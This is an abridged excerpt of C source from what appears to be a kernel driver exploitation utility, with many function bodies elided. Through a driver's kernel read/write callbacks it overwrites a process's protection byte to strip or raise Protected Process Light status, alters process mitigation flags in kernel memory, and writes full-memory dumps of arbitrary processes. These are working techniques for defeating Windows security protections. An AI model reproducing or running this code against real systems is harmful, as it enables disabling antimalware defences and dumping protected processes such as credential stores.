...
LPCSTR KDUGetProtectionTypeAsString(_In_ ULONG Type) {
    LPCSTR typeStrings[] = {"PsProtectedTypeNone",
                            "PsProtectedTypeProtectedLight",
                            "PsProtectedTypeProtected"};

    return (Type <= PsProtectedTypeProtected) ? typeStrings[Type]
                                              : "Unknown Type";
}

LPCSTR KDUGetProtectionSignerAsString(_In_ ULONG Signer) {
    static LPCSTR signerStrings[] = {
        "PsProtectedSignerNone",    "PsProtectedSignerAuthenticode",
        "PsProtectedSignerCodeGen", "PsProtectedSignerAntimalware",
        "PsProtectedSignerLsa",     "PsProtectedSignerWindows",
        "PsProtectedSignerWinTcb",  "PsProtectedSignerWinSystem",
        "PsProtectedSignerApp"};

    return (Signer <= PsProtectedSignerApp) ? signerStrings[Signer]
                                            : "Unknown Value";
}
 ...
 *
 */
BOOL KDUDumpProcessMemory(_In_ PKDU_CONTEXT Context, _In_ HANDLE ProcessId) {
    BOOL bResult = FALSE;
    ...
    do {
        if (!ntsupQueryProcessEntryById(ProcessId, (PBYTE)procBuffer,
                                        &procEntry)) {
        ...
        supPrintfEvent(kduEventInformation,
                       "[+] Dumping memory of the process 0x%lX (%wZ)\r\n",
                       HandleToUlong(ProcessId), procEntry->ImageName);

        dbgModule =
            LoadLibraryEx(L"dbghelp.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
        if (dbgModule == NULL) {
            supShowWin32Error("[!] Cannot load dbghelp.dll", GetLastError());
            break;
        }

        pMiniDumpWriteDump = (pfnMiniDumpWriteDump)GetProcAddress(
            dbgModule, "MiniDumpWriteDump");
        if (pMiniDumpWriteDump == NULL) {
            supShowWin32Error("[!] Dump function is not found", GetLastError());
            break;
        }

        bResult = KDUOpenProcess(Context, ProcessId, PROCESS_ALL_ACCESS,
                                 &processHandle);
        ...
        StringCchPrintf(szOutputName, RTL_NUMBER_OF(szOutputName),
                        TEXT("vmem_pid_%lX.dmp"), HandleToUlong(ProcessId));

        hFile = CreateFile(szOutputName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           0, NULL);
        ...
        bResult = pMiniDumpWriteDump(processHandle, 0, hFile,
                                     MiniDumpWithFullMemory, NULL, NULL, NULL);

        if (bResult) {
            supPrintfEvent(kduEventInformation,
                           "[+] Process memory dumped to %ws\r\n",
                           szOutputName);
        } else {
 ...
 *
 */
BOOL KDURunCommandPPL(_In_ PKDU_CONTEXT Context,
    ...
    if (HighestSigner) {  // the highest observed protection is
                          // WinTcb(6)/ProtectedLight(1)
 ...
 *
 */
BOOL KDUUnprotectProcess(_In_ PKDU_CONTEXT Context, _In_ ULONG_PTR ProcessId) {
    return KDUControlProcessProtections(
        Context, ProcessId, PsProtectedSignerNone, PsProtectedTypeNone);
}
 ...
 *
 */
BOOL KDUUnmitigateProcess(_In_ PKDU_CONTEXT Context,
                          _In_ ULONG_PTR ProcessId,
                          _In_ ULONG PsNewMitigations,
                          _In_ INT TargetedFlags) {
    return KDUControlProcessMitigationFlags(Context, ProcessId,
                                            PsNewMitigations, TargetedFlags);
}
 ...
 *
 */
VOID printProtection(_In_ ULONG Buffer) {
 ...
 *
 */
VOID printMitigationFlags(_In_ INT Index, _In_ ULONG Buffer) {
 ...
 *
 */
ULONG_PTR KDUGetProtectionOffset(_In_ ULONG NtBuildNumber) {
 ...
 *
 */
BOOL KDUControlProcessProtections(_In_ PKDU_CONTEXT Context,
                                  _In_ ULONG_PTR ProcessId,
        ...
        if (bResult && (ProcessObject != 0)) {
            ...
            if (Offset == 0) {
                ...
                if (Context->Provider->Callbacks.ReadKernelVM(
                        Context->DeviceHandle, VirtualAddress, &Buffer,
                        sizeof(ULONG))) {
                    ...
                    Buffer =
                        (Buffer & 0xFFFFFF00) |
                        ((PsProtectionSigner << 4) | (PsProtectionType & 0x7));
                    ...
                    if (bResult) {
                        ...
                        ULONG verifyBuf = 0;
                        if (Context->Provider->Callbacks.ReadKernelVM(
                                Context->DeviceHandle, VirtualAddress,
                                &verifyBuf, sizeof(UCHAR))) {
                            printf_s(
                                "[+] Kernel memory read at %p succeeded\r\n",
                                (void*)VirtualAddress);
 ...
 *
 */
BOOL KDUControlProcessMitigationFlags(_In_ PKDU_CONTEXT Context,
                                      _In_ ULONG_PTR ProcessId,
                                      _In_ ULONG PsNewMitigations,
                                      _In_ INT TargetedFlags) {
    BOOL bResult1 = TRUE;
    ...
    if (NT_SUCCESS(ntStatus)) {
        ...
        if (bResult1 && (ProcessObject != 0)) {
            ...
            if (Offset1 == 0 || Offset2 == 0) {
                ...
                VirtualAddress1 =
                    EPROCESS_TO_MITIGATIONFLAGS(ProcessObject, Offset1);
                VirtualAddress2 =
                    EPROCESS_TO_MITIGATIONFLAGS(ProcessObject, Offset2);
                ...
                bResult1 = Context->Provider->Callbacks.ReadKernelVM(
                    Context->DeviceHandle, VirtualAddress1, &Buffer1,
                    sizeof(ULONG));

                bResult2 = Context->Provider->Callbacks.ReadKernelVM(
                    Context->DeviceHandle, VirtualAddress2, &Buffer2,
                    sizeof(ULONG));
                ...
                if (bResult1 && bResult2) {
                    ...
                    if (TargetedFlags & PS_MITIGATION_FLAGS1) {
                        ...
                        bResult1 = Context->Provider->Callbacks.WriteKernelVM(
                            Context->DeviceHandle, VirtualAddress1, &Buffer1,
                            sizeof(ULONG));
                    }
                    ...
                    if (TargetedFlags & PS_MITIGATION_FLAGS2) {
                        ...
                        bResult2 = Context->Provider->Callbacks.WriteKernelVM(
                            Context->DeviceHandle, VirtualAddress2, &Buffer2,
                            sizeof(ULONG));
                    }
                    ...
                    if (bResult1 && bResult2) {
                        ...
                        ULONG verifyBuf1 =
                            0xDEADBEEF;  // if DEADBEEF is in output, read
                                         // failed, this is a sanity check
                        if (Context->Provider->Callbacks.ReadKernelVM(
                                Context->DeviceHandle, VirtualAddress1,
                                &verifyBuf1, sizeof(ULONG))) {
                            printf_s(
                                "[+] Kernel memory read at %p succeeded\r\n",
                                (void*)VirtualAddress1);
                        ...
                        if (Context->Provider->Callbacks.ReadKernelVM(
                                Context->DeviceHandle, VirtualAddress2,
                                &verifyBuf2, sizeof(ULONG))) {
                            printf_s(
                                "[+] Kernel memory read at %p succeeded\r\n",
                                (void*)VirtualAddress2);
